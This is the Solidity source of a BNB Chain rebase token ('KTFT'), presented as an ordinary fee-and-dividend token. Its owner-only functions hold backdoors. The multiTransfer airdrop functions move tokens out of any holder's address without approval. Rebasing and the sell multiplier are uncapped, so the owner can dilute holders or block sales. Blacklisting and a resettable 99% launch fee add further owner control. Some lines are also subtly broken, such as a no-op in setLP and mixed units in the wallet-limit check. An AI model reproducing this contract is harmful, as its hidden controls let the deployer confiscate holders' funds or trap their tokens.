// SPDX-License-Identifier: MIT

pragma solidity ^0.7.4;

import "./SafeMath.sol";
import "./SafeMathInt.sol";
import "./IBEP20.sol";
import "./Auth.sol";
import "./IDEXRouter.sol";
import "./InterfaceLP.sol";
import "./IDEXFactory.sol";
import "./DividendDistributor.sol";

contract ZILLAMATRIX is IBEP20, Auth {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "KTFT";
    string constant _symbol = "KTFT";
    uint8 constant _decimals = 6;

    mapping (address => uint256) _rBalance;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isTimelockExempt;
    mapping (address => bool) public isDividendExempt;

    uint256 public liquidityFee    = 1;
    uint256 public reflectionFee   = 7;
    uint256 public marketingFee    = 1;
    uint256 public devFee          = 1;
    uint256 public totalFee        = marketingFee + reflectionFee + liquidityFee + devFee;
    uint256 public feeDenominator  = 100;

    bool public blacklistMode = true;
    bool public walletTransferAllowed = true;
    mapping (address => bool) public isBlacklisted;

    uint256 public deadBlocks = 2;
    uint256 public launchedAt = 0;

    uint256 public sellMultiplier  = 100;

    address public autoLiquidityReceiver; 
    address public marketingFeeReceiver;
    address public devFeeReceiver;

    uint256 targetLiquidity = 10;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;
    InterfaceLP public pairContract; 

    bool public tradingOpen = true;

    DividendDistributor public distributor;
    uint256 distributorGas = 500000;

    bool public buyCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 15;
    mapping (address => uint) private cooldownTimer;

    bool public swapEnabled = true;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    address public master;
    modifier onlyMaster() {
        require(msg.sender == master || isOwner(msg.sender));
        _;
    }

    event LogRebase(uint256 indexed epoch, uint256 totalSupply);

    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 1 * 10**6 * 10**_decimals;
    uint256 public swapThreshold = rSupply * 10 / 10000;
    uint256 public rebase_count = 0;
    uint256 public rate;
    uint256 public _totalSupply;
    uint256 private constant MAX_UINT256 = ~uint256(0);
    uint256 private constant MAX_SUPPLY = ~uint128(0);
    uint256 private constant rSupply = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);

    // Max wallet & Transaction
    uint256 public _maxTxAmount = rSupply.div(100).mul(100);
    uint256 public _maxWalletToken = rSupply.div(100).mul(100);

    function rebase_percentage_master(uint256 _percentage_base1000, bool reduce) public onlyMaster returns (uint256 newSupply){
        require(_percentage_base1000 < 101, "Cant rebase more than 10%");
        if(reduce){
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)).mul(-1));
        } else{
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)));
        }
    }

    function rebase_percentage_owner(uint256 _percentage_base1000, bool reduce) public onlyOwner returns (uint256 newSupply){
        if(reduce){
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)).mul(-1));
        } else{
            newSupply = rebase(0,int(_totalSupply.div(1000).mul(_percentage_base1000)));
        }
    }

    function rebase_percentage_base1000000(uint256 _percentage_base1000000, bool reduce) public onlyOwner returns (uint256 newSupply){
        if(reduce){
            newSupply = rebase(0,int(_totalSupply.div(1000000).mul(_percentage_base1000000)).mul(-1));
        } else{
            newSupply = rebase(0,int(_totalSupply.div(1000000).mul(_percentage_base1000000)));
        }
    }

    // Sauce
    function rebase(uint256 epoch, int256 supplyDelta) public onlyOwner returns (uint256) {
        rebase_count++;
        if(epoch == 0){
            epoch = rebase_count;
        }

        require(!inSwap, "Try again");

        if (supplyDelta == 0) {
            emit LogRebase(epoch, _totalSupply);
            return _totalSupply;
        }

        if (supplyDelta < 0) {
            _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
        } else {
            _totalSupply = _totalSupply.add(uint256(supplyDelta));
        }

        if (_totalSupply > MAX_SUPPLY) {
            _totalSupply = MAX_SUPPLY;
        }

        rate = rSupply.div(_totalSupply);
        pairContract.sync();

        emit LogRebase(epoch, _totalSupply);
        return _totalSupply;
    }



    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _allowances[address(this)][address(router)] = uint256(-1);

        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        rate = rSupply.div(_totalSupply);

        distributor = new DividendDistributor(address(router));

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        isFeeExempt[0x62Bdd1E7D717b7eB8f1e4673C4f6E04A52882f0C] = true;
        isTxLimitExempt[0x62Bdd1E7D717b7eB8f1e4673C4f6E04A52882f0C] = true;

        isTimelockExempt[0x62Bdd1E7D717b7eB8f1e4673C4f6E04A52882f0C] = true;
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;

        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;

        autoLiquidityReceiver = DEAD;
        marketingFeeReceiver = 0x4e63f67328821E643f12a4bca669C32201ccC25d;
        devFeeReceiver = 0x501E98A6E8ab90E9d36Ced044Cfd2Cd11221a6f9;

        _rBalance[0x62Bdd1E7D717b7eB8f1e4673C4f6E04A52882f0C] = rSupply;
        emit Transfer(address(0), 0x62Bdd1E7D717b7eB8f1e4673C4f6E04A52882f0C, _totalSupply);
    }

    receive() external payable { }

    
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }

    function balanceOf(address account) public view override returns (uint256) {
        return _rBalance[account].div(rate);
    }
    
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    
    
    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");

            if(!walletTransferAllowed){
            require(sender == pair || recipient == pair, "Wallet transfers not allowed");
            }
        }

        uint256 rAmount = amount.mul(rate);

        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != devFeeReceiver  && recipient != autoLiquidityReceiver){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + rAmount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}
        
        if (sender == pair &&
            buyCooldownEnabled &&
            !isTimelockExempt[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp,"buy Cooldown exists");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }

        // Blacklist
        if(blacklistMode){
            require(!isBlacklisted[sender] && !isBlacklisted[recipient],"Blacklisted");    
        }

        // Checks max transaction limit
        checkTxLimit(sender, rAmount);

        if(shouldSwapBack()){ swapBack(); }

        //Exchange tokens
        _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");

        uint256 amountReceived = (!shouldTakeFee(sender) || !shouldTakeFee(recipient)) ? rAmount : takeFee(sender, rAmount,(recipient == pair));
        _rBalance[recipient] = _rBalance[recipient].add(amountReceived);

        // Dividend tracker
        if(!isDividendExempt[sender]) {
            try distributor.setShare(sender, balanceOf(sender)) {} catch {}
        }

        if(!isDividendExempt[recipient]) {
            try distributor.setShare(recipient, balanceOf(recipient)) {} catch {} 
        }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, amountReceived.div(rate));
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 rAmount = amount.mul(rate);
        _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");
        _rBalance[recipient] = _rBalance[recipient].add(rAmount);
        emit Transfer(sender, recipient, rAmount.div(rate));
        return true;
    }

    function checkTxLimit(address sender, uint256 rAmount) internal view {
        require(rAmount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }


    function takeFee(address sender, uint256 rAmount, bool isSell) internal returns (uint256) {
        
        uint256 multiplier = 100;
        if(isSell){
            multiplier = sellMultiplier;
        } 

        uint256 feeAmount = rAmount.div(feeDenominator * 100).mul(totalFee).mul(multiplier);

        if(!isSell && (launchedAt + deadBlocks) > block.number){
            feeAmount = rAmount.div(100).mul(99);
        }

        _rBalance[address(this)] = _rBalance[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount.div(rate));

        return rAmount.sub(feeAmount);
    }

  
    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _rBalance[address(this)] >= swapThreshold;
    }


    function clearStuckBalance(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    
    
    function clearStuckBalance_sender(uint256 amountPercentage) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
    }

    
    
    function set_sell_multiplier(uint256 Multiplier) external onlyOwner{
        sellMultiplier = Multiplier;        
    }
    
    function setMainPair(address mainPair) public onlyOwner {
        pair = mainPair;
        isDividendExempt[pair] = true;
    }

    // switch Trading
    
    function tradingStatus(bool _status, uint256 _deadBlocks) public onlyOwner {
        tradingOpen = _status;
        if(tradingOpen && launchedAt == 0){
            launchedAt = block.number;
            deadBlocks = _deadBlocks;
        }
    }

    function launchStatus(uint256 _launchblock) public onlyOwner {
        launchedAt = _launchblock;
    }

    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

    function enable_Wallet_Transfers(bool _status) public onlyOwner {
        walletTransferAllowed = _status;
    }

    

    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201, "GAS Error: max allowed to blacklist 200 addresses at a time"); // to prevent gas error
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }


    function cooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 tokensToSell = swapThreshold.div(rate);

        uint256 amountToLiquify = tokensToSell.div(totalFee).mul(dynamicLiquidityFee).div(2);
        uint256 amountToSwap = tokensToSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);

        try distributor.deposit{value: amountBNBReflection}() {} catch {}
        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountBNBDev, gas: 30000}("");
        
        // only to supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify.div(rate));
        }
    }

    
    
    function setIsDividendExempt(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);
        }else{
            distributor.setShare(holder, balanceOf(holder));
        }
    }
    
    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }
    
    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsTimelockExempt(address holder, bool exempt) external authorized {
        isTimelockExempt[holder] = exempt;
    }

    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _devFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        reflectionFee = _reflectionFee;
        marketingFee = _marketingFee;
        devFee = _devFee;
        totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee).add(_devFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/3, "Fees cannot be more than 33%");
    }

    
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver ) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
    }


    function setSwapBackSettings(bool _enabled, uint256 _percentage_base100000) external authorized {
        swapEnabled = _enabled;
        swapThreshold = rSupply.div(100000).mul(_percentage_base100000);
    }


    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    
    function manualSync() external {
        InterfaceLP(pair).sync();
    }
    
    function setLP(address _address) external onlyOwner {
        pairContract = InterfaceLP(_address);
        isFeeExempt[_address];
    }

    
    
    function setMaster(address _master) external onlyOwner {
        master = _master;
    }

    
    function isNotInSwap() external view returns (bool) {
        return !inSwap;
    }

    
    
    function checkSwapThreshold() external view returns (uint256) {
        return swapThreshold.div(rate);
    }


    
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution, bool _enabled) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution, _enabled);
    }
    
    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 900000);
        distributorGas = gas;
    }
    
    
    
    function rescueToken(address tokenAddress, uint256 tokens) public onlyOwner returns (bool success) {
        return IBEP20(tokenAddress).transfer(msg.sender, tokens);
    }


    function getCirculatingSupply() public view returns (uint256) {
        return (rSupply.sub(_rBalance[DEAD]).sub(_rBalance[ZERO])).div(rate);
    }


    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }


    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    function checkMaxWalletToken() external view returns (uint256) {
        return _maxWalletToken.div(rate);
    }

    
    function checkMaxTxAmount() external view returns (uint256) {
        return _maxTxAmount.div(rate);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner() {
        _maxWalletToken = rSupply.div(1000).mul(maxWallPercent_base1000);
    }

    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner() {
        _maxTxAmount = rSupply.div(1000).mul(maxTXPercentage_base1000);
    }



/* Airdrop Begins */

function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {

    require(addresses.length < 801,"GAS Error: max airdrop limit is 500 addresses"); // to prevent overflow
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens[i]);
        if(!isDividendExempt[addresses[i]]) {
            try distributor.setShare(addresses[i], balanceOf(addresses[i])) {} catch {} 
        }
    }

    // Dividend tracker
    if(!isDividendExempt[from]) {
        try distributor.setShare(from, balanceOf(from)) {} catch {}
    }
}

function multiTransfer_nodecimals(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {

    require(addresses.length < 801,"GAS Error: max airdrop limit is 500 addresses"); // to prevent overflow
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }
    SCCC = SCCC * 10**_decimals;

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],(tokens[i] * 10**_decimals));
        if(!isDividendExempt[addresses[i]]) {
            try distributor.setShare(addresses[i], balanceOf(addresses[i])) {} catch {} 
        }
    }

    // Dividend tracker
    if(!isDividendExempt[from]) {
        try distributor.setShare(from, balanceOf(from)) {} catch {}
    }
}

function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {

    require(addresses.length < 2001,"GAS Error: max airdrop limit is 2000 addresses"); // to prevent overflow

    uint256 SCCC = tokens * addresses.length;

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens);
        if(!isDividendExempt[addresses[i]]) {
            try distributor.setShare(addresses[i], balanceOf(addresses[i])) {} catch {} 
        }
    }

    // Dividend tracker
    if(!isDividendExempt[from]) {
        try distributor.setShare(from, balanceOf(from)) {} catch {}
    }
}

event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}